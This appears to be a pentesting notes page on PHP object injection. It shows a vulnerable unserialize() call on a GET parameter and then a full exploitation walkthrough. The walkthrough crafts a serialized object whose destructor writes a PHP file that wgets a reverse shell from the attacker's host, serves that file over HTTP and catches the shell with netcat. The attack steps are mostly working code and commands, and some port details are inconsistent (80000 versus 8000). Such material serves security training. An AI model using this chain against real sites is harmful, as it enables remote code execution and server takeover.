---
title: PHP Object Injection
description: PHP Object Injection is a type of vulnerability that can occur when untrusted user input is deserialized in a PHP application.
tags:
    - Web
refs:
    - https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
    - https://github.com/R0B1NL1N/PayloadsAllTheThings/blob/master/PHP%20serialization/README.md
date: 2023-02-17
draft: false
---

## Investigation

Below is an example of an `index.php` in a PHP web application.

```php
<?php

class Example {

	public $file = 'example.txt';
	public $msg = 'Hello World';
	

	public function SomeFunc() {
		// Some code ...
	}

	public function __destruct() {

		file_put_contents(__DIR__ . '/' . $this->file,$this->msg,FILE_APPEND);
	}

}

$data = unserialize($_GET['data']);

// Some code ...

?>
```

This code adds a text file named **`example.txt`**,  which contains "Hello World" strings, into the web root directory.  If the **"data"** parameter (`/?data=...`) is given, this value will be unserialized by **`unserialize()`** method.  
In short, we can inject the serialized malicious code to the value of the **`data`** parameter.

For example, we can access to **`https://example.com/?data=<serialized_code_here>`** then our arbitrary code will be executed.

<br />

## Exploitation

The exploitation assumes the above situation (**”index.php”** in the **“Investigation”** section).  
We generate the serialized data and inject it to the **“data”** parameter.

### Automation

[PHPGGC](https://github.com/ambionics/phpggc) is a library of PHP **`unserialize()`** payloads along with a tool to generate them.

```bash
# List all gadeget chains
phpggc -l
```

### Reverse Shell

1. **Prepare a PHP Reverse Shell Script**
    
    First prepare a PHP script for reverse shell.
    
    ```bash
    # Copy the payload to the current working directory
    cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
    
    # or
    
    # Download from repository
    wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
    ```
    
    Then update **`$ip`** and **`$port`** with your local ip and port.

2. **Generate a Serialized Malicious Data**
    
    Next, create a malicious **“Example”** class contains **`__destruct()`** method in PHP.  
    This script add the **“download.php”**, which downloads a PHP reverse shell script, into the web root directory. Then prints the URL encoded serialized **“Example”** class.
    
    Replace **`<local-ip>`** with your local ip address.
    
    ```php
    <?php
    
    class Example {
    
    	public $file = 'download.php';
    	public $msg = "<?php system('wget http://<local-ip>:8000/shell.php -O shell.php'); ?>";
    	
    
    	public function SomeFunc() {
    		// Some code ...
    	}
    
    	public function __destruct() {
    
    		file_put_contents(__DIR__ . '/' . $this->file,$this->msg,FILE_APPEND);
    	}
    
    }
    
    print urlencode(serialize(new Example));
    
    ?>
    ```
    
    Then generate a deserialized data.
    
    ```bash
    php generate.php
    ```
    
    Copy the output data.

3. **Download a Reverse Shell Script.**
    
    In local machine, start local web server where the PHP reverse shell script located.
    
    ```php
    python3 -m http.server 80000
    ```
    
    Now access to `https://example.com/?data=<serialized_data_here>`.  
    
    By this, our PHP reverse shell script is download to the target web root (e.g. `https://example.com/shell.php`).
    
4. **Get a Shell**
    
    Finally the conditions are ready.  
    Start a listener in local machine to receive the outcoming connection.
    
    ```php
    nc -lvnp 4444
    ```
    
    Access to **`https://example.com/shell.php`**.  
    We should get a shell.
